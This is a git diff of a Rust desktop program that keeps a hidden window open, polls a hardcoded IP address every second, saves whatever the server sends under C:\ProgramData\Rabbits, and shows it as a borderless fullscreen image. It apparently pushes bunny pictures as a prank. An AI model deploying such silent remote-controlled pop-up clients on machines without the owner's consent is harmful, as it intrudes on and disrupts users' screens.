@@ -1,45 +1,55 @@
-use std::{thread, time::Duration, net::TcpStream, io::{Read, self, Result}, fs};
+use std::{thread, time::Duration, net::{TcpStream, SocketAddr, SocketAddrV4, Ipv4Addr}, io::{Read, self, Result}, fs};
 use chrono::offset::Local;
-use cushy::{kludgine::{app::winit::window::Fullscreen, image::io::Reader, wgpu::FilterMode, LazyTexture}, widgets::image::Image, Run, widget::MakeWidget};
+use cushy::{PendingApp, kludgine::{figures::{units::UPx, Size}, app::winit::window::Fullscreen, image::io::Reader, wgpu::FilterMode, LazyTexture}, widgets::{image::Image, Resize, self}, Run, widget::{MakeWidget, WidgetInstance}, window::Window, Open, Application};
 
-const PING_MS_FREQUENCY: u64 = 5000;
+const PING_FREQ_MS: Duration = Duration::from_millis(1000);
+const SERVER_IP: SocketAddr = SocketAddr::V4(SocketAddrV4::new(Ipv4Addr::new(67, 8, 144, 213), 3523));
 
-fn main() -> io::Result<()> {
-    let ping_frequency = Duration::from_secs(PING_MS_FREQUENCY);
+fn main() {
+    let app = PendingApp::default();
+    let app_handle = app.as_app();
 
-    loop {
-        let attempted_server_connection = TcpStream::connect("67.8.144.213:3523");
-        if let Ok(mut connection) = attempted_server_connection {
-            let mut file_buffer = Vec::new();
-            connection.read_to_end(&mut file_buffer)?;
+    thread::spawn(move || {
+        dbg!("thread open");
+        loop {
+            let attempted_server_connection = TcpStream::connect_timeout(&SERVER_IP, Duration::from_millis(500));
+            dbg!("attempting server connect");
+            if let Ok(mut connection) = attempted_server_connection {
+                let mut file_buffer = Vec::new();
+                connection.read_to_end(&mut file_buffer).expect("uh oh");
 
-            let new_file_path = write_to_file(file_buffer)?;
-            display_bunny(&new_file_path);
-            thread::sleep(ping_frequency);
+                let downloaded_file_path = write_to_file(file_buffer).unwrap();
+                create_bun_window(&downloaded_file_path).open(&app_handle).expect("msg");
+                thread::sleep(PING_FREQ_MS);
+            }
+
+            thread::sleep(PING_FREQ_MS);
         }
+    });
 
-        thread::sleep(ping_frequency);
-    }
-
-    // Ok(())
+    create_hidden_window().open(&app).expect("why");
+    app.run().expect("p");
 }
 
-fn display_bunny(file: &str) {
-    let bunny_image = Reader::open(file).expect("placehodler 1").decode().expect("pacehoder 2");
-    let bunny_texture = LazyTexture::from_image(bunny_image, FilterMode::Linear);
-    let dimensions = bunny_texture.size();
+// This is a workaround:
+// Without this window, Cushy shuts the program down whenever the last remaining window (bun_window) is closed
+fn create_hidden_window() -> Window<WidgetInstance> {
+    let mut empty_window = widgets::Space::default().into_window();
+    empty_window.attributes.visible = false;
+    empty_window
+}
 
-    let width_overflow = dimensions.width.get().saturating_sub(1920);
-    let height_overflow = dimensions.height.get().saturating_sub(1080);
-    let image_scaling = 
-    if width_overflow > height_overflow {
-        1920f32 / dimensions.width.get() as f32
-    } else {1080f32 / dimensions.height.get() as f32};
+fn create_bun_window(file: &str) -> Window<WidgetInstance> {
+    let bun_image = Reader::open(file).expect("placehodler 1").decode().expect("pacehoder 2");
+    let bun_texture = LazyTexture::from_image(bun_image, FilterMode::Linear);
 
-    let bunny_widget = Image::new(bunny_texture).scaled(image_scaling).centered();
-    let mut bunny_window = bunny_widget.into_window();
-    bunny_window.attributes.fullscreen = Some(Fullscreen::Borderless(None));
-    bunny_window.run().expect("placeholder 3");
+    let dimensions = bun_texture.size();
+    let image_scaling = scale_img_from(dimensions);
+
+    let bun_widget = widgets::Image::new(bun_texture).scaled(image_scaling).centered();
+    let mut bun_window = bun_widget.into_window();
+    bun_window.attributes.fullscreen = Some(Fullscreen::Borderless(None));
+    bun_window
 }
 
 fn write_to_file(file_buffer: Vec<u8>) -> Result<String> {
@@ -49,8 +59,16 @@ fn write_to_file(file_buffer: Vec<u8>) -> Result<String> {
     let dir_path = "C:\\ProgramData\\Rabbits";
     let file_path = format!("{dir_path}\\{file_name}");
 
-    fs::create_dir(dir_path); // ignore err on existing directory
+    fs::create_dir(dir_path); // ignore err when dir exists
     fs::write(&file_path, file_buffer)?;
 
     Ok(file_path)
+}
+
+fn scale_img_from(dimensions: Size<UPx>) -> f32 {
+    let width_overflow = dimensions.width.get().saturating_sub(1920);
+    let height_overflow = dimensions.height.get().saturating_sub(1080);
+    if width_overflow > height_overflow {
+        1920f32 / dimensions.width.get() as f32
+    } else {1080f32 / dimensions.height.get() as f32}
 }
